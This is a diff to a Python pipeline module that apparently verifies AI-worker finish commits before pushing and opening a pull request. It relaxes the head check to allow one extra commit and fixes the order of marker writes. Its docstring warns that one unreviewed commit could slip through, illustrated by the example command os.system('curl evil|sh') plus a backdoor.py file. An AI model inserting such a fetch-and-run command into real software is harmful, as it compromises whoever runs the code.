@@ -21,13 +21,20 @@ from .result_contract import (
     parse_worker_result,
     render_result_template,
     sanitize_result_text,
+    verify_optional_single_commit,
 )
-from .review_reconciliation import _create_task
+from .review_reconciliation import (
+    RetryableReviewRegistration,
+    _create_task,
+    profile_phase,
+    render_profile_prompt,
+)
 from .state import _atomic_write_text
 
 log = logging.getLogger(__name__)
 
 FINISH_KEY = "finish"
+FINISH_PHASE_KEY = "phase_8_finish_branch"
 
 
 def _git(worktree: Path, *args: str) -> str:
@@ -472,19 +479,53 @@ def _delivery_authority(state_dir: Path, tick_id: str, worktree: Path,
 
 def _verify_finish(worktree: Path, result, accepted_head: str,
                    *, require_current: bool) -> None:
-    git = result.git
-    if (
-        git.expected_parent_sha != accepted_head
-        or git.resulting_head_sha != accepted_head
-        or git.task_commit_sha != accepted_head
-        or git.changed_files
-    ):
-        raise ResultContractError("finish_review_head_mismatch")
-    if require_current and (
-        _git(worktree, "rev-parse", "HEAD") != accepted_head
-        or _git(worktree, "status", "--porcelain=v1", "--untracked-files=all")
-    ):
-        raise ResultContractError("finish_review_head_mismatch")
+    """Anchor the delivered head to the accepted review head.
+
+    The phase profile lets ``phase_8_finish_branch`` commit required release,
+    documentation or pull-request metadata as one separate atomic commit, so
+    demanding ``HEAD == accepted_head`` would reject a worker that did exactly
+    what the profile mandates. What may still not happen is delivery of a
+    history that does not descend from the one the review blessed:
+    ``accepted_head`` must remain on HEAD's first-parent mainline, and at most
+    one commit may sit between them, so a forged, rebased or side-merged
+    history is refused.
+
+    State the bound honestly, because it is weaker than a path check and this
+    docstring previously overstated it. What the relaxation admits is **one
+    commit of arbitrary content**, made in a session no reviewer sees: the
+    checks here constrain the commit's *topology* -- how many, whose child, and
+    that its reported paths match its real diff -- and nothing at all about
+    what it does. A single commit that rewrites a source file into
+    ``os.system('curl evil|sh')`` and adds a ``backdoor.py``, honestly
+    reported, satisfies every check on this path and is delivered. Before the
+    profile became authoritative ``changed_files == ()`` was required, so the
+    count of unreviewed commits that could reach delivery was zero; it is now
+    one. The human merge gate on the pull request is the only remaining control
+    over that commit's content. Constraining which paths a finish commit may
+    touch would change which runs are accepted -- and could reject legitimate
+    release metadata layouts in other repositories -- so it is deliberately not
+    decided here.
+    """
+    try:
+        verify_optional_single_commit(
+            worktree, result.git, expected_parent_sha=accepted_head,
+            require_current=require_current,
+        )
+    except ResultContractError as exc:
+        # A git exit code >= 2 means git could not answer, which is not the
+        # same claim as "the worker's report is wrong": let it through with its
+        # own code so the operator reads a broken worktree as broken. Every
+        # git-failure helper in ``result_contract`` raises this one code, so
+        # the set is a single member rather than a list that drifts.
+        if exc.code == "git_verification_failed":
+            raise
+        raise ResultContractError("finish_review_head_mismatch", exc.code) from exc
+    # No live-branch re-measurement follows. Under ``require_current`` the
+    # verifier above already proved ``HEAD == result.git.resulting_head_sha``
+    # and bounded ``accepted_head..resulting_head_sha`` to 0 or 1 commits on
+    # the first-parent mainline, so an ancestry test and a commit count against
+    # HEAD restate those two facts about the same commit and can never
+    # disagree with them.
 
 
 def _blocked(tick_id: str, code: str) -> bool:
@@ -555,27 +596,38 @@ def reconcile_todo_completion(
         except ResultContractError:
             return True
         _delivery_authority(state_dir, tick_id, registration.worktree, repo=repo, create=True)
-        _create_task(
-            tenant=tenant, tick_id=tick_id, todo_id=registration.todo_id,
-            key=FINISH_KEY, title="Verify, push, and open pull request",
-            prompt=(
-                "Run every required repository gate on the clean reviewed head, then "
-                "push the registered branch and create or update its pull request. "
-                f"Do not merge. The expected parent is {head}; do not modify the "
-                "worktree or add any commit, so HEAD stays on that SHA."
-            ),
-            result_template=render_result_template(
-                tick_id=tick_id,
-                todo_id=registration.todo_id,
-                step_key=FINISH_KEY,
-                section="delivery",
-                pinned_head_sha=head,
-                branch=registration.branch,
-                allow_no_changes=True,
-            ),
-            worktree=registration.worktree, assignee=registration.assignee,
-            prompt_client=registration.prompt_client,
-        )
+        phases_path, phase = profile_phase(registration, FINISH_PHASE_KEY)
+        try:
+            _create_task(
+                project_dir=project_dir,
+                tenant=tenant, tick_id=tick_id, todo_id=registration.todo_id,
+                key=FINISH_KEY, title=phase.name,
+                prompt=render_profile_prompt(
+                    registration, phase, phases_path, tick_id=tick_id, tenant=tenant,
+                    facts={
+                        "accepted_review_head_sha": head,
+                        "branch": registration.branch,
+                    },
+                ),
+                result_template=render_result_template(
+                    tick_id=tick_id,
+                    todo_id=registration.todo_id,
+                    step_key=FINISH_KEY,
+                    section="delivery",
+                    branch=registration.branch,
+                    allow_no_changes=True,
+                ),
+                worktree=registration.worktree, assignee=registration.assignee,
+                prompt_client=registration.prompt_client,
+                tools=phase.tools, turns=phase.turns, timeout=phase.timeout,
+            )
+        except RetryableReviewRegistration:
+            # Same handling ``reconcile_reviews`` gives the review card's own
+            # ambiguous create: the card may or may not have landed, so the
+            # next tick re-derives the truth from the snapshot. Letting it
+            # propagate raises the whole tick, and a tick that raises now fails
+            # the harness run as ``tick_crashed`` instead of costing one tick.
+            log.info("tick %s: finish card create is pending; retrying next tick", tick_id)
         return True
     if finish.status != "done":
         return True
@@ -594,8 +646,6 @@ def reconcile_todo_completion(
             registration.worktree, payload, accepted_head,
             require_current=not finish_verified.exists(),
         )
-        if not finish_verified.exists():
-            _atomic_write_text(finish_verified, accepted_head + "\n")
         delivery = payload.delivery
         if delivery.head_sha != payload.git.resulting_head_sha:
             raise ResultContractError("delivery_head_mismatch")
@@ -606,6 +656,13 @@ def reconcile_todo_completion(
         if pr_match is None or pr_match.group(1).lower() != repo.lower():
             raise ResultContractError("pr_identity_mismatch")
         pr_number = int(pr_match.group(2))
+        # Written last, only once every check above has passed. This marker is
+        # what relaxes ``require_current`` on the next tick, so writing it
+        # before ``delivery_head_mismatch``, ``delivery_authority_drift`` and
+        # ``pr_identity_mismatch`` were checked handed the weaker verification
+        # to the next tick on the strength of a tick that had FAILED delivery.
+        if not finish_verified.exists():
+            _atomic_write_text(finish_verified, accepted_head + "\n")
     except ResultContractError as exc:
         return _blocked(tick_id, exc.code)
 
